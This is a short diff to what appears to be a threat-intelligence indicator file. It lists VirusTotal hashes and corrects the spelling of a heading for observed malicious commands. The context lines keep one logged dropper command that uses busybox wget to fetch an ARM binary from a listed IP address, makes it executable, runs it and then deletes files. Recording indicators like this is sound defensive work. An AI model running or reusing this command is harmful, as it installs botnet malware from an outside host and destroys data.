@@ -20,7 +20,7 @@ https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093
 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
 https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 cd /data/local/tmp/; busybox wget http://45.90.97.58/skid.arm7; chmod 777 skid.arm7; ./skid.arm7 lol; rm -rf *
 
